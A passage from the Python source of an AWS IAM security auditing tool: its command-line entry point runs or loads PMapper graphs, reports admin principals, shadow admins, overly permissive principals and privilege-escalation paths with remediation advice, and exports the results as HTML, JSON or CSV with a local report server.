            print(f"[+] CSV exported: {output_path}")
        else:
            print("[!] No findings to export to CSV")


def main():
    parser = argparse.ArgumentParser(
        description="Advanced AWS IAM Security Analysis Tool - Full PMapper Replacement",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run pmapper with auto-detected regions (recommended)
  %(prog)s --profile my-aws-profile --create-graph
  %(prog)s --profile profile1 --profile profile2 --create-graph

  # Run pmapper with manual exclude-regions (old behavior)
  %(prog)s --profile my-aws-profile

  # Read existing pmapper graph data
  %(prog)s --input /path/to/pmapper/graph/
  %(prog)s --input ./account1 --input ./account2

  # Export formats
  %(prog)s --profile prod --format html,json,csv

  # Auto-detect existing pmapper data
  %(prog)s --auto-detect

  # PMapper-style queries (requires --input or --profile)
  %(prog)s -i ./graph --query "who can do iam:CreateUser"
  %(prog)s -i ./graph --query "who can do s3:GetObject"
  %(prog)s -i ./graph --query "sts:AssumeRole"

  # Preset queries
  %(prog)s -i ./graph --preset privesc      # Privilege escalation paths
  %(prog)s -i ./graph --preset admin        # All admin principals
  %(prog)s -i ./graph --preset shadow       # Shadow admins
  %(prog)s -i ./graph --preset secrets      # Secrets access
  %(prog)s -i ./graph --preset dangerous    # Any dangerous permissions
        """,
    )

    parser.add_argument(
        "--profile", "-p",
        action="append",
        dest="profiles",
        metavar="PROFILE",
        help="AWS profile to analyze (runs pmapper). Can specify multiple.",
    )

    parser.add_argument(
        "--input", "-i",
        action="append",
        dest="inputs",
        metavar="PATH",
        help="Path to pmapper graph directory (can specify multiple)",
    )

    parser.add_argument(
        "--output", "-o",
        default=f"privmapper_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
        help="Output directory (default: privmapper_report_TIMESTAMP)",
    )
    parser.add_argument(
        "--format", "-f",
        default="html",
        help="Output formats: html,json,csv (comma-separated, default: html)",
    )
    parser.add_argument(
        "--auto-detect", "-a",
        action="store_true",
        help="Auto-detect pmapper graph directories",
    )
    parser.add_argument(
        "--exclude-regions",
        default=EXCLUDE_REGIONS,
        help="Regions to exclude during graph creation (space-separated)",
    )
    parser.add_argument(
        "--create-graph",
        action="store_true",
        help="Auto-detect enabled regions and run pmapper graph create (recommended)",
    )

    parser.add_argument(
        "--query", "-Q",
        metavar="QUERY",
        help="PMapper-style query (e.g., 'who can do iam:CreateUser', 'who can do s3:GetObject with arn:aws:s3:::bucket/*')",
    )
    parser.add_argument(
        "--preset",
        choices=["privesc", "admin", "shadow", "cross-account", "ssm", "secrets", "s3", "dangerous"],
        help="Run preset query (privesc=privilege escalation, admin=all admins, shadow=shadow admins, etc.)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=1337,
        help="Port for local HTTP server to view report (default: 1337)",
    )
    parser.add_argument(
        "--no-server",
        action="store_true",
        help="Don't start HTTP server after generating report",
    )

    args = parser.parse_args()

    output_dir = Path(args.output)
    analyses = []
    profile_results = {}

    run_metadata = RunMetadata(
        run_timestamp=datetime.now().strftime("%d %b %Y %H:%M:%S"),
        output_directory=str(output_dir.absolute()),
        output_formats=[f.strip().lower() for f in args.format.split(",")],
    )

    all_regions_used: List[str] = []
    all_regions_excluded: List[str] = []

    if args.profiles:
        print(f"\n{'='*60}")
        print(f"  PrivMapper Advanced - IAM Security Analysis")
        print(f"  Mode: Run PMapper")
        print(f"  Profiles: {', '.join(args.profiles)}")
        if args.create_graph:
            print(f"  Region Detection: Auto (enabled regions only)")
        print(f"{'='*60}\n")

        output_dir.mkdir(parents=True, exist_ok=True)

        for profile in args.profiles:
            log(f"{'═'*50}")
            log(f"Profile: {profile}")
            log(f"{'═'*50}")

            runner = PMapperRunner(
                profile,
                output_dir,
                exclude_regions=args.exclude_regions,
                auto_detect_regions=args.create_graph
            )
            stats, results, svg_path = runner.run_full_analysis()

            if runner.regions_used:
                all_regions_used.extend(runner.regions_used)
                run_metadata.auto_detected_regions = runner.used_auto_detect
            if runner.regions_excluded:
                all_regions_excluded.extend(runner.regions_excluded)

            if not stats:
                err(f"Failed to analyze {profile}")
                continue

            profile_results[profile] = {
                "stats": stats,
                "results": results,
                "svg_path": svg_path,
            }

            analyzer = QueryResultsAnalyzer(results, stats)
            capabilities = analyzer.build_principal_capabilities()
            privesc_paths = analyzer.get_privesc_paths()
            shadow_admins = analyzer.get_shadow_admins()
            admins = analyzer.get_admins()

            findings = []

            non_managed_admins = [a for a in admins if not any(re.search(p, a) for p in AWS_MANAGED_PATTERNS)]
            if non_managed_admins:
                findings.append(Finding(
                    id=f"{stats.get('account_id', 'unknown')}_admin_access",
                    title="Principals with Administrator Access",
                    severity="critical",
                    category="iam",
                    description="These principals have full administrative access to all AWS services.",
                    principals=list(non_managed_admins),
                    impact="Compromise of any of these credentials results in full account takeover.",
                    remediation="Review each admin principal. Remove AdministratorAccess where not required.",
                ))

            if shadow_admins:
                shadow_details = []
                for sa in shadow_admins[:20]:
                    caps = capabilities.get(sa, set())
                    shadow_details.append({
                        "arn": sa,
                        "name": sa.split("/")[-1] if "/" in sa else sa,
                        "capabilities": [CHECK_LABEL.get(c, c) for c in sorted(caps) if c in CHECK_LABEL][:10],
                    })

                findings.append(Finding(
                    id=f"{stats.get('account_id', 'unknown')}_shadow_admin",
                    title="Shadow Administrators",
                    severity="critical",
                    category="iam",
                    description="These principals can escalate to admin privileges without having "
                               "AdministratorAccess policy attached.",
                    principals=shadow_admins,
                    impact="Hidden administrative access that bypasses standard security reviews.",
                    remediation="Remove excessive permissions that enable privilege escalation.",
                    details={"principals_detail": shadow_details},
                ))

            overly_permissive = []
            for principal, caps in sorted(capabilities.items(), key=lambda x: -len(x[1])):
                if principal in admins or principal in shadow_admins:
                    continue
                if any(re.search(p, principal) for p in AWS_MANAGED_PATTERNS):
                    continue
                if len(caps) >= 3:
                    iam_caps = caps & IAM_CHECKS
                    groups = []
                    if len(iam_caps) >= IAM_WILDCARD_THRESHOLD:
                        groups.append({"group": "iam:*", "severity": "critical"})
                    elif iam_caps:
                        groups.append({"group": "IAM (specific)", "severity": "high"})
                    if caps & CRED_CHECKS:
                        groups.append({"group": "Credential Access", "severity": "high"})
                    if caps & COMPUTE_CHECKS:
                        groups.append({"group": "Service Compute Abuse", "severity": "high"})

                    overly_permissive.append({
                        "arn": principal,
                        "name": principal.split("/")[-1] if "/" in principal else principal,
                        "severity": "critical" if len(iam_caps) >= IAM_WILDCARD_THRESHOLD else "high",
                        "capabilities": [CHECK_LABEL.get(c, c) for c in sorted(caps) if c in CHECK_LABEL][:8],
                        "capability_groups": groups,
                    })

            if overly_permissive:
                findings.append(Finding(
                    id=f"{stats.get('account_id', 'unknown')}_overly_permissive",
                    title="Overly Permissive IAM Principals",
                    severity="high",
                    category="iam",
                    description="These principals have permissions significantly broader than required.",
                    principals=[op["arn"] for op in overly_permissive[:20]],
                    impact="Increased blast radius in case of credential compromise.",
                    remediation="Apply least-privilege principles. Use IAM Access Analyzer.",
                    details={"principals_detail": overly_permissive[:20]},
                ))

            if privesc_paths:
                findings.append(Finding(
                    id=f"{stats.get('account_id', 'unknown')}_privesc",
                    title=f"Privilege Escalation Paths ({len(privesc_paths)} found)",
                    severity="critical",
                    category="privesc",
                    description="Non-admin principals can escalate to administrative access.",
                    principals=sorted(set(p.get("source", "") for p in privesc_paths[:20])),
                    impact="Attackers with access to these principals can gain full account control.",
                    remediation="Remove or restrict permissions that enable escalation.",
                    details={"paths": privesc_paths[:20]},
                ))

            analysis = AccountAnalysis(
                account_id=stats.get("account_id", "unknown"),
                account_alias=profile,
                node_count=int(stats.get("nodes", 0)),
                edge_count=int(stats.get("edges", 0)),
                admin_count=int(stats.get("admins", 0)),
                principals={},
                edges=[],
                policies={},
                findings=findings,
                escalation_paths=[],
                cross_account_trusts=[],
                shadow_admins=[],
                overly_permissive=[],
            )
            analyses.append(analysis)

            ok(f"Profile {profile} complete - {len(findings)} findings")

    else:
        input_paths = []

        if args.inputs:
            for p in args.inputs:
                path = Path(p)
                if path.exists():
                    if (path / "nodes.json").exists():
                        input_paths.append(path)
                    elif (path / "graph" / "nodes.json").exists():
                        input_paths.append(path / "graph")
                    else:
                        for subdir in path.iterdir():
                            if subdir.is_dir():
                                if (subdir / "nodes.json").exists():
                                    input_paths.append(subdir)
                                elif (subdir / "graph" / "nodes.json").exists():
                                    input_paths.append(subdir / "graph")
                else:
                    print(f"[!] Path not found: {p}")

        if args.auto_detect or not input_paths:
            detected = find_pmapper_graphs()
            if detected:
                print(f"[*] Auto-detected {len(detected)} pmapper graph(s)")
                input_paths.extend(detected)

        if not input_paths:
            print("[!] No pmapper graph data found.")
            print("    Use --profile to run pmapper, or --input to specify graph data")
            print("    Example: python privmapper_advanced.py --profile my-aws-profile")
            print("    Example: python privmapper_advanced.py --input /path/to/graph/")
            sys.exit(1)

        input_paths = list(dict.fromkeys(input_paths))

        print(f"\n{'='*60}")
        print(f"  PrivMapper Advanced - IAM Security Analysis")
        print(f"  Mode: Read Existing Graph Data")
        print(f"  Analyzing {len(input_paths)} graph(s)")
        print(f"{'='*60}\n")

        for graph_path in input_paths:
            print(f"[*] Loading: {graph_path}")

            loader = GraphLoader(graph_path)
            if not loader.validate():
                print(f"[!] Invalid graph directory: {graph_path}")
                continue

            principals, edges, policies = loader.load()
            print(f"    Loaded {len(principals)} principals, {len(edges)} edges, {len(policies)} policies")

            engine = AnalysisEngine(principals, edges, policies)
            analysis = engine.analyze()
            analyses.append(analysis)

            print(f"    Found {len(analysis.findings)} findings, {len(analysis.escalation_paths)} escalation paths")

    if not analyses:
        print("[!] No valid graphs to analyze")
        sys.exit(1)

    if args.query or args.preset:
        for analysis in analyses:
            query_engine = QueryEngine(analysis)

            if args.query:
                print(f"\n[*] Running query: {args.query}")
                results = query_engine.query(args.query)
                query_engine.print_results(results, f"Query: {args.query}")

            if args.preset:
                preset_info = QueryEngine.PRESETS.get(args.preset, {})
                print(f"\n[*] Running preset: {args.preset}")
                results = query_engine.run_preset(args.preset)
                query_engine.print_results(results, preset_info.get("name", args.preset))

        if not args.format or args.format == "html":
            print("\n[*] Query complete. Use --format to also generate a full report.")
            sys.exit(0)

    cross_findings = []
    if len(analyses) > 1:
        print(f"\n[*] Running cross-account analysis...")
        cross_analyzer = CrossAccountAnalyzer(analyses)
        cross_findings = cross_analyzer.analyze()
        print(f"    Found {len(cross_findings)} cross-account findings")

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    if args.profiles:
        run_metadata.profiles = args.profiles
    if args.inputs:
        run_metadata.input_paths = [str(p) for p in args.inputs] if args.inputs else []
    run_metadata.regions_used = list(dict.fromkeys(all_regions_used))
    run_metadata.regions_excluded = list(dict.fromkeys(all_regions_excluded))

    formats = [f.strip().lower() for f in args.format.split(",")]

    if "html" in formats:
        HTMLExporter.export(analyses, cross_findings, output_dir / "report.html", run_metadata)

    if "json" in formats:
        JSONExporter.export(analyses, output_dir / "findings.json")

    if "csv" in formats:
        CSVExporter.export(analyses, output_dir / "findings.csv")

    print(f"\n{'='*60}")
    print(f"  Analysis Complete")
    print(f"  Output: {output_dir}/")
    print(f"{'='*60}\n")

    total_critical = sum(len([f for f in a.findings if f.severity == "critical"]) for a in analyses)
    total_paths = sum(len(a.escalation_paths) for a in analyses)

    if total_critical > 0:
        print(f"  [!] {total_critical} CRITICAL findings require immediate attention")
    if total_paths > 0:
        print(f"  [!] {total_paths} privilege escalation paths detected")

    if "html" in formats and not args.no_server:
        report_path = output_dir / "report.html"
        print(f"\n  Starting local server on port {args.port}...")
        print(f"  Open in browser: http://localhost:{args.port}/report.html")
        print(f"  Press Ctrl+C to stop the server\n")

        import http.server
        import socketserver

        os.chdir(output_dir)

        class QuietHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                pass

        try:
            with socketserver.TCPServer(("127.0.0.1", args.port), QuietHandler) as httpd:
                httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n  Server stopped.")
        except OSError as e:
            if "Address already in use" in str(e):
                print(f"  [!] Port {args.port} is already in use. Use --port to specify a different port.")
            else:
                print(f"  [!] Could not start server: {e}")
            print(f"\n  Open report manually: open {output_dir}/report.html\n")
    else:
        print(f"\n  Open report: open {output_dir}/report.html\n")


if __name__ == "__main__":
    main()
